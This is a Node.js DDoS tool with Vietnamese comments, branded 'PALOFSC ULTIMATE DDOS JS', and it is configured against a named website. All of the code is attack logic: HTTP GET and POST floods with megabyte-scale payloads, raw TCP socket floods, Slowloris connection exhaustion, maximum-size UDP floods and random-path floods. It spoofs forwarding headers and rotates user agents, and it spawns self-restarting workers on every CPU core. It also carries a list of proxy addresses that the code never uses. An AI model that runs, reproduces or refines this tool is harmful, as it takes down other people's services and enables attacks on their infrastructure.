// ============================================================
// ⚡ PALOFSC ULTIMATE DDOS JS - SIÊU VIP AUTO SẬP ⚡
// TÍNH NĂNG: ĐA LUỒNG - TỰ ĐỘNG GẮN PROXY - KHÔNG GIỚI HẠN
// LƯU FILE: ddos_sieu_vip.js
// CHẠY: node ddos_sieu_vip.js
// CẢNH BÁO: CHỈ CHẠY TRÊN MÁY CẤU HÌNH MẠNH - RAM 8GB+
// ============================================================

const https = require('https');
const http = require('http');
const url = require('url');
const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

// ============================================================
// CONFIG TẤN CÔNG SIÊU VIP
// ============================================================
const CONFIG = {
    TARGET_URL: "https://go88z.co.com/", // <-- THAY URL MỤC TIÊU
    PORT: 443,
    TOTAL_PROCESSES: os.cpus().length, // Dùng hết CPU
    THREADS_PER_PROCESS: 50,
    REQUEST_TIMEOUT: 50, // ms - càng thấp càng nhanh
    SOCKET_FLOOD_COUNT: 200,
    UDP_FLOOD_SIZE: 65507, // Kích thước gói UDP tối đa
    SLOWLORIS_CONNECTIONS: 100,
    DURATION: Infinity, // Vô hạn
};

// ============================================================
// DANH SÁCH PROXY VIP (TỰ ĐỘNG GẮN)
// ============================================================
const PROXY_LIST = [
    "103.156.15.22:8080",
    "45.77.56.114:3128",
    "191.96.42.184:3128",
    "176.9.119.170:3128",
    "51.89.255.67:80",
    "143.110.188.34:8080",
    "161.35.70.249:8080",
    "167.172.248.53:3128",
    "142.93.128.78:3128",
    "159.89.206.45:8080",
    "104.248.63.18:80",
    "45.55.27.15:3128",
    "64.225.4.63:999",
    "139.59.1.14:8080",
    "188.166.83.17:3128",
    "178.128.50.206:8080",
    "103.253.146.10:3128",
    "45.76.145.25:8080",
    "202.182.54.185:3128",
    "45.77.168.170:8080",
    "51.15.242.202:3128",
    "163.172.182.164:3128",
    "51.38.71.101:8080",
    "163.172.168.124:3128",
    "212.47.239.105:3128",
];

// ============================================================
// USER AGENTS NGẪU NHIÊN
// ============================================================
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
];

// ============================================================
// PAYLOAD SIÊU NẶNG
// ============================================================
function generateMassivePayload() {
    const types = [
        "A".repeat(999999), // 1MB string
        JSON.stringify({ data: Array(1000).fill("X".repeat(10000)) }), // JSON khổng lồ
        "B".repeat(888888),
        crypto.randomBytes(500000).toString('hex'), // Random 500KB hex
        Array(500).fill("param=value&").join("") + "x=" + "X".repeat(99999),
    ];
    return types[Math.floor(Math.random() * types.length)];
}

function generateHeavyQuery() {
    let params = [];
    for (let i = 0; i < 200; i++) {
        params.push(`p${i}=${crypto.randomBytes(256).toString('hex')}`);
    }
    return "?" + params.join("&");
}

function getRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function getRandomProxy() {
    return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function generateFakeHeaders() {
    return {
        "User-Agent": getRandomUserAgent(),
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-Forwarded-For": getRandomIP(),
        "X-Real-IP": getRandomIP(),
        "X-Client-IP": getRandomIP(),
        "X-Forwarded-Proto": Math.random() > 0.5 ? "https" : "http",
        "X-Forwarded-Host": crypto.randomBytes(8).toString('hex') + ".com",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.google.com/search?q=" + crypto.randomBytes(16).toString('hex'),
        "Origin": "https://" + crypto.randomBytes(8).toString('hex') + ".com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
    };
}

// ============================================================
// CLASS TẤN CÔNG CHÍNH
// ============================================================
class VIPDDoSAttacker {
    constructor(targetUrl, id) {
        this.targetUrl = targetUrl;
        this.id = id;
        this.parsedUrl = url.parse(targetUrl);
        this.hostname = this.parsedUrl.hostname;
        this.port = this.parsedUrl.port || (this.parsedUrl.protocol === 'https:' ? 443 : 80);
        this.isHttps = this.parsedUrl.protocol === 'https:';
        this.requestCount = 0;
        this.isRunning = true;
        this.activeConnections = 0;
    }

    // TẤN CÔNG HTTP GET FLOOD
    async httpGetFlood() {
        while (this.isRunning) {
            try {
                const promises = [];
                for (let i = 0; i < 10; i++) {
                    promises.push(this.sendGetRequest());
                }
                await Promise.allSettled(promises);
                this.requestCount += 10;
            } catch (e) {}
        }
    }

    sendGetRequest() {
        return new Promise((resolve) => {
            const heavyQuery = generateHeavyQuery();
            const path = this.parsedUrl.path + heavyQuery;
            
            const options = {
                hostname: this.hostname,
                port: this.port,
                path: path,
                method: 'GET',
                headers: generateFakeHeaders(),
                timeout: CONFIG.REQUEST_TIMEOUT,
                rejectUnauthorized: false,
            };

            const requester = this.isHttps ? https : http;
            
            const req = requester.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    this.activeConnections--;
                    resolve();
                });
                res.on('error', () => {
                    this.activeConnections--;
                    resolve();
                });
            });

            req.on('error', () => {
                this.activeConnections--;
                resolve();
            });
            req.on('timeout', () => {
                req.destroy();
                this.activeConnections--;
                resolve();
            });

            this.activeConnections++;
            req.end();
        });
    }

    // TẤN CÔNG HTTP POST FLOOD
    async httpPostFlood() {
        while (this.isRunning) {
            try {
                const promises = [];
                for (let i = 0; i < 5; i++) {
                    promises.push(this.sendPostRequest());
                }
                await Promise.allSettled(promises);
                this.requestCount += 5;
            } catch (e) {}
        }
    }

    sendPostRequest() {
        return new Promise((resolve) => {
            const payload = generateMassivePayload();
            const path = this.parsedUrl.path;
            const headers = generateFakeHeaders();
            headers['Content-Type'] = Math.random() > 0.5 ? 'application/json' : 'application/x-www-form-urlencoded';
            headers['Content-Length'] = Buffer.byteLength(payload);
            
            const options = {
                hostname: this.hostname,
                port: this.port,
                path: path,
                method: 'POST',
                headers: headers,
                timeout: CONFIG.REQUEST_TIMEOUT,
                rejectUnauthorized: false,
            };

            const requester = this.isHttps ? https : http;
            
            const req = requester.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    this.activeConnections--;
                    resolve();
                });
                res.on('error', () => {
                    this.activeConnections--;
                    resolve();
                });
            });

            req.on('error', () => {
                this.activeConnections--;
                resolve();
            });
            req.on('timeout', () => {
                req.destroy();
                this.activeConnections--;
                resolve();
            });

            this.activeConnections++;
            req.write(payload);
            req.end();
        });
    }

    // TẤN CÔNG SOCKET TCP FLOOD
    async socketFlood() {
        while (this.isRunning) {
            try {
                const promises = [];
                for (let i = 0; i < CONFIG.SOCKET_FLOOD_COUNT; i++) {
                    promises.push(this.sendSocketFlood());
                }
                await Promise.allSettled(promises);
            } catch (e) {}
        }
    }

    sendSocketFlood() {
        return new Promise((resolve) => {
            const client = new net.Socket();
            client.setTimeout(CONFIG.REQUEST_TIMEOUT);
            
            client.connect(this.port, this.hostname, () => {
                const requests = [];
                for (let i = 0; i < 50; i++) {
                    requests.push(
                        `GET ${this.parsedUrl.path} HTTP/1.1\r\n` +
                        `Host: ${this.hostname}\r\n` +
                        `User-Agent: ${getRandomUserAgent()}\r\n` +
                        `X-Forwarded-For: ${getRandomIP()}\r\n` +
                        `Accept: */*\r\n` +
                        `Connection: keep-alive\r\n\r\n`
                    );
                }
                client.write(requests.join(''));
                this.requestCount++;
                client.destroy();
                resolve();
            });

            client.on('error', () => resolve());
            client.on('timeout', () => {
                client.destroy();
                resolve();
            });
        });
    }

    // TẤN CÔNG SLOWLORIS
    async slowlorisAttack() {
        const connections = [];
        
        for (let i = 0; i < CONFIG.SLOWLORIS_CONNECTIONS; i++) {
            try {
                const client = new net.Socket();
                client.setTimeout(0);
                
                client.connect(this.port, this.hostname, () => {
                    client.write(
                        `POST ${this.parsedUrl.path} HTTP/1.1\r\n` +
                        `Host: ${this.hostname}\r\n` +
                        `User-Agent: ${getRandomUserAgent()}\r\n` +
                        `Content-Length: 999999999\r\n` +
                        `Content-Type: application/x-www-form-urlencoded\r\n` +
                        `Connection: keep-alive\r\n\r\n`
                    );
                    
                    // Giữ kết nối bằng cách gửi header từ từ
                    const keepAlive = setInterval(() => {
                        try {
                            client.write(`X-${crypto.randomBytes(4).toString('hex')}: ${crypto.randomBytes(16).toString('hex')}\r\n`);
                        } catch (e) {
                            clearInterval(keepAlive);
                        }
                    }, 10000);
                    
                    connections.push({ client, keepAlive });
                });
                
                client.on('error', () => {});
            } catch (e) {}
        }
        
        // Giữ connections mở
        while (this.isRunning) {
            await new Promise(r => setTimeout(r, 60000));
        }
        
        // Cleanup
        connections.forEach(({ client, keepAlive }) => {
            clearInterval(keepAlive);
            try { client.destroy(); } catch (e) {}
        });
    }

    // TẤN CÔNG UDP FLOOD
    async udpFlood() {
        const client = dgram.createSocket('udp4');
        
        while (this.isRunning) {
            try {
                const message = crypto.randomBytes(CONFIG.UDP_FLOOD_SIZE);
                client.send(message, this.port, this.hostname, (err) => {
                    if (!err) this.requestCount++;
                });
            } catch (e) {}
        }
    }

    // TẤN CÔNG RANDOM PATH
    async randomPathAttack() {
        while (this.isRunning) {
            try {
                const randomPath = "/" + crypto.randomBytes(32).toString('hex');
                const options = {
                    hostname: this.hostname,
                    port: this.port,
                    path: randomPath + generateHeavyQuery(),
                    method: 'GET',
                    headers: generateFakeHeaders(),
                    timeout: CONFIG.REQUEST_TIMEOUT,
                    rejectUnauthorized: false,
                };

                const requester = this.isHttps ? https : http;
                
                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => resolve());
                });
                req.on('error', () => {});
                req.on('timeout', () => req.destroy());
                req.end();
                this.requestCount++;
            } catch (e) {}
        }
    }

    // CHẠY TẤT CẢ PHƯƠNG THỨC
    async startAllAttacks() {
        const attacks = [
            this.httpGetFlood(),
            this.httpPostFlood(),
            this.socketFlood(),
            this.slowlorisAttack(),
            this.udpFlood(),
            this.randomPathAttack(),
        ];
        await Promise.all(attacks);
    }

    stop() {
        this.isRunning = false;
    }
}

// ============================================================
// MAIN - KHỞI ĐỘNG CLUSTER
// ============================================================
if (cluster.isMaster) {
    console.clear();
    console.log("=".repeat(80));
    console.log("    ⚡⚡ PALOFSC ULTIMATE DDOS JS ENGINE v4.0 ⚡⚡");
    console.log("    MODE: SIÊU VIP - AUTO SẬP - ĐA LUỒNG TỐI ĐA");
    console.log("=".repeat(80));
    console.log(`    [+] Mục tiêu: ${CONFIG.TARGET_URL}`);
    console.log(`    [+] Tiến trình: ${CONFIG.TOTAL_PROCESSES} (toàn bộ CPU)`);
    console.log(`    [+] Luồng/tiến trình: ${CONFIG.THREADS_PER_PROCESS}`);
    console.log(`    [+] Tổng luồng: ${CONFIG.TOTAL_PROCESSES * CONFIG.THREADS_PER_PROCESS}`);
    console.log(`    [+] Proxy: ${PROXY_LIST.length} proxy VIP`);
    console.log(`    [+] RAM: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(1)} GB`);
    console.log(`    [+] CPU: ${os.cpus()[0].model}`);
    console.log("=".repeat(80));
    console.log("    [*] ĐANG KHỞI ĐỘNG TẤN CÔNG TỔNG LỰC...");
    console.log("    [*] TẤT CẢ CPU ĐANG ĐƯỢC HUY ĐỘNG...");
    console.log("=".repeat(80));

    let totalRequests = 0;
    const workers = [];

    // Fork workers cho mỗi CPU core
    for (let i = 0; i < CONFIG.TOTAL_PROCESSES; i++) {
        const worker = cluster.fork();
        workers.push(worker);

        worker.on('message', (msg) => {
            if (msg.type === 'requestCount') {
                totalRequests += msg.count;
                if (totalRequests % 50000 === 0) {
                    console.log(`[VIP] Tổng requests: ${totalRequests.toLocaleString()} | Workers: ${workers.length} | ĐANG SẬP MỤC TIÊU...`);
                }
            }
        });

        worker.on('exit', (code) => {
            console.log(`[!] Worker ${worker.process.pid} thoát - Khởi động lại...`);
            const newWorker = cluster.fork();
            const index = workers.indexOf(worker);
            if (index > -1) workers[index] = newWorker;
        });
    }

    console.log(`[+] ĐÃ KHỞI ĐỘNG ${workers.length} WORKERS THÀNH CÔNG!`);
    console.log("[*] CUỘC TẤN CÔNG ĐANG DIỄN RA Ở MỨC TỐI ĐA...");
    console.log("[*] NHẤN Ctrl+C ĐỂ DỪNG (NẾU CÓ THỂ)...");
    console.log("=".repeat(80));

    // Báo cáo định kỳ
    setInterval(() => {
        const memUsage = process.memoryUsage();
        console.log(`[STATS] Requests: ${totalRequests.toLocaleString()} | RAM: ${(memUsage.heapUsed / 1024 / 1024).toFixed(1)}MB | Workers: ${workers.length} | ĐANG CHẠY...`);
    }, 5000);

    process.on('SIGINT', () => {
        console.log(`\n[!] ĐÃ DỪNG! Tổng requests: ${totalRequests.toLocaleString()}`);
        workers.forEach(w => {
            try { w.kill(); } catch (e) {}
        });
        process.exit(0);
    });

} else {
    // WORKER PROCESS
    const parsedTarget = url.parse(CONFIG.TARGET_URL);
    const attacker = new VIPDDoSAttacker(CONFIG.TARGET_URL, cluster.worker.id);
    
    // Gửi báo cáo về master
    setInterval(() => {
        try {
            process.send({ type: 'requestCount', count: attacker.requestCount });
            attacker.requestCount = 0;
        } catch (e) {}
    }, 1000);

    // Khởi chạy tất cả phương thức tấn công
    console.log(`[Worker ${cluster.worker.id}] PID: ${process.pid} - Đã sẵn sàng tấn công!`);
    attacker.startAllAttacks().catch(() => {});
}